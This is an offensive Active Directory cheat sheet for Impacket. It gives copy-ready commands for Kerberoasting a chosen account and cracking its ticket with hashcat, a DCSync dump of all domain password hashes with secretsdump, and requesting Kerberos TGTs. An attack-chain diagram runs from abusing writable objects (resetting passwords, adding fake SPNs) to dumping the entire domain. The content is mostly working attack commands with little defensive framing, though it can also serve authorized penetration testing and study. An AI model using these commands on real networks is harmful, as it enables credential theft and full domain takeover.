# Impacket - Kerberoast a Specific User

## Purpose

Request a TGS ticket for a user with an SPN and crack the service ticket offline.

### Requirements

- [ ] Target account has an SPN
- [ ] Valid domain credentials
- [ ] Connectivity to the Domain Controller

### Command

```bash
impacket-GetUserSPNs \
<DOMAIN>/<USERNAME>:'<PASSWORD>' \
-request-user <TARGET_USER> \
-dc-ip <DC_IP>
```

### Output

Produces a Kerberos TGS hash suitable for cracking.

Example:

```text
$krb5tgs$23$...
```

### Next Step

Crack using Hashcat:

```bash
hashcat -m 13100 hash.txt wordlist.txt
```

---

# Impacket - DCSync (Dump Domain Hashes)

## Purpose

Perform a DCSync attack to retrieve password hashes directly from Active Directory.

### Requirements

One of the following:

- [ ] Replicating Directory Changes
- [ ] Replicating Directory Changes All
- [ ] Domain Admin
- [ ] Enterprise Admin
- [ ] Administrator
- [ ] Equivalent replication privileges

### Command

```bash
impacket-secretsdump \
<DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP> \
-just-dc \
-outputfile <OUTPUT_NAME>
```

### Example

```bash
impacket-secretsdump \
example.local/administrator:'Password123!'@192.168.1.10 \
-just-dc \
-outputfile domain_dump
```

### Output

Creates files containing:

- NTLM hashes
- LM hashes (if present)
- Kerberos keys
- Domain credential material

---

# Typical Attack Chain

```text
Obtain credentials
        │
        ▼
Find writable objects
(get writable --detail)
        │
        ▼
Discover GenericWrite / GenericAll
        │
        ├───────────────┐
        ▼               ▼
Reset Password      Add Fake SPN
        │               │
        ▼               ▼
Login as user     Kerberoast User
        │               │
        ▼               ▼
Gain More Privs  Crack Password
        │               │
        └───────┬───────┘
                ▼
      Obtain Replication Rights
                ▼
         secretsdump -just-dc
                ▼
          Dump Entire Domain
---
```

# Impacket - Request a Kerberos TGT

## Purpose

Authenticate to Active Directory and obtain a Kerberos Ticket Granting Ticket (TGT).

This creates a `.ccache` file that can later be used with Kerberos authentication (`-k`, `--use-kcache`).

### Requirements

- [ ] Valid domain credentials
- [ ] Kerberos (TCP/UDP 88) reachable
- [ ] Time synchronized with the Domain Controller

### Command

```bash
impacket-getTGT '<DOMAIN>/<USERNAME>:<PASSWORD>'
```

### Example

```bash
impacket-getTGT 'example.local/alice:Password123!'
```

### Output

```
alice.ccache
```

### Common Follow-up

```bash
export KRB5CCNAME=alice.ccache
```

Most Impacket, BloodyAD, NetExec and BloodHound commands can now authenticate using Kerberos.

---
